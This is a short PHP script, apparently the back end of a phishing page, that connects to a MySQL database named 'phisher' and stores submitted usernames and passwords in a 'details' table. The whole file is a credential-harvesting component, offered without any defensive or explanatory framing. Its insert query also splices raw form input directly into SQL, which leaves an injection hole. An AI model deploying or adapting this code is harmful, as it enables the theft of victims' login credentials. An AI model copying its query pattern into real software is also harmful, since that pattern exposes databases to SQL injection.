<?php
$hostname = "localhost";
$username = "Treasure";
$password = "Yes";
$database = "phisher"; // Change this to your actual database name
$table = "details"; // Change this to your actual table name

// Create connection
$conn = new mysqli($hostname, $username, $password, $database);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Retrieve values from the form
$name = $_POST['username'];
$passwordValue = $_POST['password'];

// SQL query to insert data into a specific table
$sql = "INSERT INTO $table (email, password) VALUES ('$name', '$passwordValue')";

if ($conn->query($sql) === TRUE) {
    echo "Data inserted successfully";
} else {
    echo "Error: " . $sql . "<br>" . $conn->error;
}

// Close connection
$conn->close();
?>
